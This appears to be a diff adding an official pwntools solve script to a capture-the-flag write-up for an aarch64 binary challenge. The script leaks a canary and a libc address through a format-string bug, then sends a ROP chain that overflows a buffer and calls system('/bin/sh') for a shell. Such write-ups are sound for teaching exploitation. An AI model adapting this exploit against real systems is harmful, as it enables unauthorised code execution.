@@ -187,3 +187,64 @@ Since $sp point to binsh, it will load sp + 16 into x19, so now x19 will point t
 
 Since x2 is pointing to dddddddd, it will load dddddddd + 16, which is binsh into x0. Then, it will load eeeeeeee and libc.symbol['system'] into x29, x30 respectively. Then return to system because its in x30
 
+## Official Solve Script
+
+```py
+from pwn import *
+
+# context.terminal = ['tmux', 'split-window', '-h']
+
+elf = context.binary = ELF('chal')
+libc = ELF('libc.so.6')
+ld = ELF('ld-linux-aarch64.so.1')
+
+p = process('qemu-aarch64 -g 1234 chal'.split())
+
+# p = process('qemu-aarch64 chal'.split())
+
+# p = remote('localhost', 1234)
+
+p.sendlineafter(b'2. Legs\n', b'1')
+p.sendlineafter(b'of?\n', b'1337')
+p.sendlineafter(b'appendage? ', b'%13$p%21$p%19$p')
+
+p.recv()
+leaks = p.recv().split(b'0x')
+# main is at the 23rd offset
+main_leak = leaks[1]
+main = int(main_leak, 16)
+# libc_start_main + 152 is at the 21st offset MAKE SURE TO SUBTRACT 152 FROM THE LEAK
+libc_start_main_leak = leaks[2]
+libc_start_main = int(libc_start_main_leak, 16) - 152
+
+canaryleak = leaks[3].split(b'\n')[0]
+canary = int(canaryleak, 16)
+
+print(hex(libc.symbols['__libc_start_main']))
+libc.address = libc_start_main - libc.symbols['__libc_start_main']
+print(leaks)
+print(hex(canary))
+print(hex(libc.address))
+
+ldr_x19 = 0x00000000004008f4 # 0x00000000004008f4 : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
+binsh = libc.search(b'/bin/sh').__next__()
+mov_x2_sp = 0x0000000000400910 # 0x0000000000400910 : mov x2, sp ; ldp x29, x30, [sp], #0x10 ; ret
+ldr_x0_x2 = 0x000000000040091c # 0x000000000040091c : ldr x0, [x2, #0x10] ; ldp x29, x30, [sp], #0x10 ; ret
+payload = flat([
+    'a' * 104,
+    canary,
+    'b' * 8,    #x29
+    mov_x2_sp,  #x30
+    'c' * 8,
+    canary,
+    'd' * 8,    #x2     #x29
+    ldr_x19,            #x30
+    binsh,
+    ldr_x0_x2,
+    'e' * 24,
+    libc.symbols['system']
+])
+
+p.sendline(payload)
+p.interactive()
+```
